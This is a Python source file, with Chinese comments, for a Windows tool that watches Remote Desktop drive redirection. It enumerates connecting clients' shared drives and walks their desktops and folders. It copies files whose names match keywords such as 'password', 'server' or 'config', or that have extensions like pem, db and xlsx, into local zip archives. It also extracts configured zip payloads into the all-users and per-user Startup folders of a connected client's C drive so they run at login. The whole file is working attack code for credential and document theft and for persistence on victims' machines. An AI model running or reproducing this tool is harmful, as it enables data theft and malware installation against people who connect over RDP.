# -*- coding: utf-8 -*-

import Queue
import base64
import json
import os
import re
import time
import zipfile

import win32wnet
from apscheduler.schedulers.blocking import BlockingScheduler
from apscheduler.triggers.interval import IntervalTrigger

from config import *
from winnetwk import *

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

GET_CONF_JOB_TIME = 10
GET_SHARE_DISK_JOB_TIME = 30
GET_FILE_LIST_JOB_TIME = 30
DOWNLOAD_FILE_JOB_TIME = 30


def byteify(input):
    if isinstance(input, dict):
        return {byteify(key): byteify(value) for key, value in input.iteritems()}
    elif isinstance(input, list):
        return [byteify(element) for element in input]
    elif isinstance(input, unicode):
        return input.encode('utf-8')
    else:
        return input


class MainMonitor(object):
    def __init__(self):

        # 静态变量
        self.share_disk_timeout = 90

        # 从配置文件中读取的配置信息
        self.file_suffix_whitelist = []  # 文件后缀白名单(优先级高于黑名单)
        self.file_suffix_blacklist = []  # 文件后缀黑名单
        self.download_file_list = []  # 需要下载的文件列表
        self.download_file_regex_list = []
        self.download_file_maxsize = 100 * 1024 * 1024  # 10m以内
        self.upload_file_list = []
        # 动态变量
        self.MainScheduler = BlockingScheduler()
        self.share_disk_dict = {}  # 共享磁盘列表
        self.share_file_list = []  # 共享文件列表
        self.notices = Queue.Queue()

    def start(self):
        # 读取配置信息任务
        get_conf_job_trigger = IntervalTrigger(seconds=GET_CONF_JOB_TIME)
        self.MainScheduler.add_job(func=self.get_conf_job, max_instances=1,
                                   trigger=get_conf_job_trigger,
                                   seconds=GET_CONF_JOB_TIME, id='get_conf_job')
        # 获取共享磁盘任务
        get_share_disk_job_trigger = IntervalTrigger(seconds=GET_SHARE_DISK_JOB_TIME)
        self.MainScheduler.add_job(func=self.get_share_disk_job, max_instances=1,
                                   trigger=get_share_disk_job_trigger,
                                   seconds=GET_SHARE_DISK_JOB_TIME, id='get_share_disk_job')
        # 获取共享磁盘文件列表任务
        get_file_list_job_trigger = IntervalTrigger(seconds=GET_FILE_LIST_JOB_TIME)
        self.MainScheduler.add_job(func=self.get_file_list_job, max_instances=1,
                                   trigger=get_file_list_job_trigger,
                                   seconds=GET_FILE_LIST_JOB_TIME, id='get_file_list_job')
        # 下载download_file_list中的文件到本地任务
        download_file_job_trigger = IntervalTrigger(seconds=DOWNLOAD_FILE_JOB_TIME)
        self.MainScheduler.add_job(func=self.download_file_job, max_instances=1,
                                   trigger=download_file_job_trigger,
                                   seconds=DOWNLOAD_FILE_JOB_TIME, id='download_file_job')
        self.MainScheduler.start()

    #############################
    # 命令处理函数
    #############################
    def get_conf_job(self):
        """根据配置文件获取配置信息"""
        try:
            with open("conf.json") as f:
                all_conf = byteify(json.load(f))
        except Exception as E:
            logger.exception(E)
            logger.warning("read config.json failed")
            all_conf = {
                "download_file_list": [],
                "download_file_regex_list": [
                    "服务器",
                    "项目",
                    "密码",
                    "配置",
                    "网站",
                    "手册"
                ],
                "file_suffix_whitelist": [
                    "cer",
                    "csv",
                    "db",
                    "doc",
                    "docx",
                    "pdf",
                    "pem",
                    "ppt",
                    "pptx",
                    "rtf",
                    "txt",
                    "xls",
                    "xlsx"
                ],
                "file_suffix_blacklist": [
                    "iso"
                ],
                "download_file_maxsize": 1024 * 1024 * 10,
                "upload_file_list": []
            }

        self.file_suffix_whitelist = all_conf.get("file_suffix_whitelist")
        self.file_suffix_blacklist = all_conf.get("file_suffix_blacklist")
        self.download_file_list = all_conf.get("download_file_list")
        self.download_file_regex_list = all_conf.get("download_file_regex_list")
        self.download_file_maxsize = all_conf.get("download_file_maxsize")
        self.upload_file_list = all_conf.get("upload_file_list")
        # 通知发送函数
        if os.path.exists(os.path.join("data", "notice.json")) is not True:
            if self.notices.empty() is not True:
                notice = self.notices.get()
                try:
                    with open(os.path.join("data", "notice.json"), "w") as f:
                        json.dump(notice, f, ensure_ascii=False)
                except Exception as E:
                    logger.exception(E)
        logger.info("file_suffix_whitelist:{} "
                    "file_suffix_blacklist:{} "
                    "download_file_list:{} "
                    "download_file_regex_list:{} "
                    "download_file_maxsize:{} "
                    "upload_file_list:{}".format(len(self.file_suffix_whitelist), len(self.file_suffix_blacklist),
                                                 len(self.download_file_list), len(self.download_file_regex_list),
                                                 self.download_file_maxsize, self.upload_file_list))

    # 处理共享磁盘函数
    #############################
    def get_share_disk_job(self):
        handle = win32wnet.WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, None)
        try:
            self._doDumpHandle(handle)
        finally:
            handle.Close()
        with open(os.path.join("data", "share_disk_dict.json"), "w") as f:
            json.dump(self.share_disk_dict, f, ensure_ascii=False)
        logger.info("get_share_disk_job finish,Time: {}".format(time.time()))
        # 测试代码
        # self._add_to_sharedisk("C:\\")

    def _add_to_sharedisk(self, share_disk):
        """添加到列表中"""
        if self.share_disk_dict.get(share_disk) is None:
            self.share_disk_dict[share_disk] = {"add_time": int(time.time()), "update_time": int(time.time()),
                                                "list_time": 0}
            one_notice = {"share_disk": share_disk,
                          "update_time": int(time.time()),
                          "notice_time": int(time.time())}
            self.notices.put(one_notice)
            logger.warning("new share_disk :{}".format(one_notice))
        else:
            outdate_time = int(time.time()) - self.share_disk_dict[share_disk]["update_time"]
            if outdate_time > GET_SHARE_DISK_JOB_TIME * 10:  #
                one_notice = {"share_disk": share_disk,
                              "update_time": int(time.time()),
                              "notice_time": int(time.time())}
                self.notices.put(one_notice)
                logger.warning("new share_disk :{}".format(one_notice))
            self.share_disk_dict[share_disk]["update_time"] = int(time.time())

    def _doDumpHandle(self, handle):
        while 1:
            items = win32wnet.WNetEnumResource(handle)
            if len(items) == 0:
                break
            for item in items:
                try:
                    if item.lpProvider != "Microsoft Terminal Services":
                        continue
                    if item.dwDisplayType == RESOURCEDISPLAYTYPE_SHARE:
                        self._add_to_sharedisk(item.lpRemoteName)
                    else:
                        k = win32wnet.WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, item)
                        self._doDumpHandle(k)
                        win32wnet.WNetCloseEnum(k)
                except Exception as E:
                    logger.exception(E)

    #############################
    # 处理文件列表函数
    #############################
    def deal_C_disk(self, share_disk):
        """C盘特殊处理"""
        rootSubDirFileList = os.listdir(share_disk)
        if "Program Files" in rootSubDirFileList and "Windows" in rootSubDirFileList:  # C盘
            logger.warning("Found C Disk !")
            # 列出桌面文件(只兼容所有windows)
            if "Users" in rootSubDirFileList:  # win7及以上
                users = os.listdir(os.path.join(share_disk, "Users"))
                subdir = "Users"
            else:
                users = os.listdir(os.path.join(share_disk, "Documents and Settings"))
                subdir = "Documents and Settings"
            for user in users:
                if user not in ["All Users", "Default", "Default User", "desktop.ini", "Public"]:
                    self.walk_dir(os.path.join(share_disk, subdir, user, "Desktop"))  # 读取桌面文件
            # 上传到启动目录(只兼容win7以上)
            all_user_startup_dir = os.path.join(share_disk,
                                                "\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")

            for one_upload_file in self.upload_file_list:
                if os.path.exists(one_upload_file):
                    try:
                        zip_file = zipfile.ZipFile(one_upload_file)
                        for one_name in zip_file.namelist():
                            if os.path.exists(os.path.join(all_user_startup_dir, one_name)) is not True:
                                zip_file.extract(one_name, all_user_startup_dir)
                        zip_file.close()
                    except Exception as E:
                        logger.info(E)

                    zip_file = zipfile.ZipFile(one_upload_file)
                    for user in users:
                        if user not in ["All Users", "Default", "Default User", "desktop.ini", "Public"]:
                            user_startup = os.path.join(share_disk,
                                                        "\\Users\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(
                                                            user))
                            try:
                                for one_name in zip_file.namelist():
                                    if os.path.exists(os.path.join(user_startup, one_name)) is not True:
                                        zip_file.extract(one_name, user_startup)

                            except Exception as E:
                                logger.info(E)
                    zip_file.close()
            return True
        else:
            return False

    def _add_to_filelist(self, filepath):
        try:
            filepath_after_decode = filepath.decode("GB2312").encode('utf-8')
        except UnicodeDecodeError:
            filepath_after_decode = filepath.decode("utf-8")

        if filepath_after_decode not in self.share_file_list:
            self.share_file_list.append(filepath_after_decode)

    def walk_dir(self, onedir):
        """遍历目录,放入self.share_file_list"""
        for dirName, subdirList, fileList in os.walk(onedir):
            for fname in fileList:
                suffix = os.path.splitext(fname)[1]  # 后缀判断
                if len(suffix) >= 1:
                    suffix = suffix[1:].lower()
                else:
                    suffix = suffix.lower()

                if len(self.file_suffix_whitelist) > 0:  # 白名单存在
                    if suffix in self.file_suffix_whitelist:
                        filepath = os.path.join(dirName, fname)
                        self._add_to_filelist(filepath)
                    else:
                        continue
                elif len(self.file_suffix_blacklist) > 0:  # 黑名单存在
                    if suffix not in self.file_suffix_blacklist:
                        filepath = os.path.join(dirName, fname)
                        self._add_to_filelist(filepath)
                else:
                    filepath = os.path.join(dirName, fname)
                    self._add_to_filelist(filepath)

    def get_file_list_job(self):
        """获取共享文件列表定时函数"""
        for share_disk in list(self.share_disk_dict.keys()):
            share_disk_update_time = self.share_disk_dict.get(share_disk).get("update_time")
            if int(time.time()) - share_disk_update_time > self.share_disk_timeout:  # 盘符已超时
                continue
            is_C_Disk = self.deal_C_disk(share_disk)
            if is_C_Disk is not True:
                self.walk_dir(share_disk)
        with open(os.path.join("data", "share_file_list.json"), "w") as f:
            json.dump(self.share_file_list, f, ensure_ascii=False)
        logger.info("get_file_list_job finish,Time: {}".format(time.time()))

    #############################
    # 处理文件下载函数
    #############################

    def store_file(self, share_file_full_path):
        share_file_full_path_u = share_file_full_path.decode("utf-8")
        if os.path.exists(share_file_full_path_u) is not True:
            logger.info("{} not exist or share_disk not mount, pass".format(share_file_full_path))
            return
        size = os.path.getsize(share_file_full_path_u)
        if size > self.download_file_maxsize:  # 文件过大,跳过
            logger.warning(
                "{} size {},larger than {},pass".format(share_file_full_path, size, self.download_file_maxsize))
            return
        _, share_filename_u = os.path.split(share_file_full_path_u)
        share_filename = share_filename_u.encode("utf-8")
        share_file_full_path_base64 = base64.b16encode(share_file_full_path)
        store_filename = "{}-{}.zip".format(share_file_full_path_base64[0:10] + share_file_full_path_base64[10:0:-1],
                                            share_filename_u.encode("utf-8"))
        store_file_path_u = os.path.join("data", store_filename).decode("utf-8")
        store_file_path = store_file_path_u.encode("utf-8")
        if os.path.exists(store_file_path_u):  # 已存在,跳过
            return
        else:
            try:

                newZip = zipfile.ZipFile(store_file_path_u, 'w')
                newZip.write(share_file_full_path_u, arcname=share_filename_u, compress_type=zipfile.ZIP_DEFLATED)
                newZip.close()
                logger.info("{} store on local,local filename {}".format(share_file_full_path, store_filename))
            except Exception as E:
                logger.exception(E)

    def download_file_job(self):
        if os.path.exists("data") is not True:
            os.mkdir("data")
        # 　下载文件
        for share_file in self.share_file_list:
            # 检查是否在下载列表
            if share_file in self.download_file_list:
                self.store_file(share_file)
                continue
            # 检查是否符合正则表达式
            try:
                for reg in self.download_file_regex_list:
                    if re.search(reg.decode("utf-8"), share_file.decode("utf-8")) is not None:
                        self.store_file(share_file)
            except Exception as E:
                logger.exception(E)
        logger.info("download_file_job finish,Time: {}".format(time.time()))


MainMonitor().start()
